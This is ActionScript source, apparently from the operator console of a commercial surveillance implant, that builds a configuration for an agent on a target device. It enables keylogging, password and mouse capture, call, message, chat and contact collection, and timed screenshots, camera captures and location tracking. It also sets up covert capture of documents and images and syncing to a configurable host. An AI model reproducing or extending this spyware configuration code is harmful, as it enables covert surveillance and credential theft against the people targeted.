package it.ht.rcs.console.operations.view.configuration.basic
{
  import it.ht.rcs.console.DefaultConfigBuilder;
  
  public class BasicConfigBuilder
  {
    
    public static function buildConfig(modules:Array, globals:Object, model:Object):Object
    {
      var newConfig:Object = {};
      
      newConfig.modules = modules;
      newConfig.globals = globals;
      
      buildConfigInternal(model, newConfig);
      
      return newConfig;
    }
    
    private static function buildConfigInternal(model:Object, newConfig:Object):void
    {
      var actions:Array = [];
      var events:Array = [];
      
      var subactions:Array = [{action: "module", module: "device", status: "start"}]; // Always start the device module
      
      if (model.call)       subactions.push({action: "module", module: "call",        status: "start"});
      if (model.calendar) { subactions.push({action: "module", module: "calendar",    status: "start"});
                            subactions.push({action: "module", module: "addressbook", status: "start"}); }
      if (model.messages) { subactions.push({action: "module", module: "messages",    status: "start"});
                            subactions.push({action: "module", module: "chat",        status: "start"}); }
      if (model.url)        subactions.push({action: "module", module: "url",         status: "start"});
      if (model.keylog)   { subactions.push({action: "module", module: "keylog",      status: "start"});
                            if (!model.isMobile) {
                            subactions.push({action: "module", module: "mouse",       status: "start"});
                            subactions.push({action: "module", module: "password",    status: "start"}); }
                          }
      if (model.file &&
         !model.isMobile) { subactions.push({action: "module", module: "file",        status: "start"}); configureFileModule(model, newConfig); }      
      
      var startupEvent:Object =  {event: "timer", subtype: "startup", start: 0, ts: "00:00:00", te: "23:59:59", enabled: true, desc: "STARTUP"};
      var startupAction:Object = {desc: "STARTUP", subactions: subactions};
      events.push(startupEvent);
      actions.push(startupAction);
      
      
      var index:int = 1;
      if (model.screenshot) {
        var screenshotEvent:Object =  {event: "timer", subtype: "loop", start: index, repeat: index, delay: model.screenshotDelay, ts: "00:00:00", te: "23:59:59", enabled: true, desc: "SCREENSHOT"};
        var screenshotAction:Object = {desc: "SCREENSHOT", subactions: [{action: "module", module: "screenshot", status: "start"}]};
        events.push(screenshotEvent);
        actions.push(screenshotAction);
        index++;
      }
      
      
      if (model.camera) {
        var cameraEvent:Object =  {event: "timer", subtype: "loop", start: index, repeat: index, delay: model.cameraDelay, iter: model.cameraIter, ts: "00:00:00", te: "23:59:59", enabled: true, desc: "CAMERA"};
        var cameraAction:Object = {desc: "CAMERA", subactions: [{action: "module", module: "camera", status: "start"}]};
        events.push(cameraEvent);
        actions.push(cameraAction);
        index++;
      }
      
      
      if (model.position) {
        var positionEvent:Object =  {event: "timer", subtype: "loop", start: index, repeat: index, delay: model.positionDelay, ts: "00:00:00", te: "23:59:59", enabled: true, desc: "POSITION"};
        var positionAction:Object = {desc: "POSITION", subactions: [{action: "module", module: "position", status: "start"}]};
        events.push(positionEvent);
        actions.push(positionAction);
        index++;
      }
      
      
      if (model.sync) {
        var syncSub:Object = DefaultConfigBuilder.getDefaultAction('synchronize');
        syncSub.host = model.syncHost;
        var syncEvent:Object =  {event: "timer", subtype: "loop", repeat: index, delay: model.syncDelay, ts: "00:00:00", te: "23:59:59", enabled: true, desc: "SYNC"};
        var syncAction:Object = {desc: "SYNC", subactions: [syncSub]};
        events.push(syncEvent);
        actions.push(syncAction);
        index++;
      }
      
      
      newConfig.events = events;
      newConfig.actions = actions;
      
    }
    
    private static function configureFileModule(model:Object, newConfig:Object):void
    {
      var file:Object;
      for each (var module:Object in newConfig.modules)
        if (module.module == 'file')
          file = module;
      
      if (file == null) return;
      
      file.open = false;
      file.capture = true;
      
      file.accept = [];
      
      if (model.documents)
        file.accept = (file.accept as Array).concat(['*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx', '*.pps', '*.ppsx',
                                                     '*.odt', '*.ods',  '*.odp', '*.rtf',  '*.txt', '*.pdf']);
      
      if (model.images)
        file.accept = (file.accept as Array).concat(['*.jpg', '*.jpeg', '*.png', '*.gif', '*.bmp']);
      
      file.deny = [ "*\\AppData\\Local*",
                    "*\\AppData\\Roaming*",
                    "*\\Skype\\Plugins\\*",
                    "*\\$RECYCLE.BIN\\*",
                    "*:\\Windows\\*",
                    "*.dll",
                    "*.exe",
                    "*.ini",
                    "*.lnk",
                    "*.ico",
                    "*.tlb",
                    "*.clb",
                    "*.dat",
                    "*.drv",
                    "*.ocx",
                    "*.url",
                    "\\\\.\\*" ];
    }
    
  }
  
}